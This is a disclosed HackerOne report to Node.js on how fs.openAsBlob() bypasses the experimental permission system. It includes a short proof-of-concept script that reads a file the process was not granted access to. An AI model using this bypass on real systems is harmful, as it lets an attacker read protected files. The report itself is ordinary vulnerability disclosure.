# fs.openAsBlob() bypasses permission system

## Report Details
- **Report ID**: 1966492
- **URL**: https://hackerone.com/reports/1966492
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-04-29T22:18:42.541Z
- **Disclosed**: 2023-07-20T20:57:15.352Z

## Reporter
- **Username**: cjihrig
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** [add summary of the vulnerability]
`fs.openAsBlob()` does not appear to be limited by the permission system.

**Description:** [add more details about this vulnerability]
Starting Node with `--experimental-permission` does not appear to restrict `fs.openAsBlob()`.

## Steps To Reproduce:

Run the following code with `--experimental-permission` and do not grant is read access to `file.txt`:

```js
'use strict';
const fs = require('node:fs');

async function main() {
	const blob = await fs.openAsBlob(__dirname + '/file.txt');

	console.log(await blob.text());
}

main();
```

## Impact: [add why this issue matters]

The permission system is bypassed when it should not be.

## Supporting Material/References:

None

## Impact

An attacker can read files they should not be able to.

## Attachments
No attachments
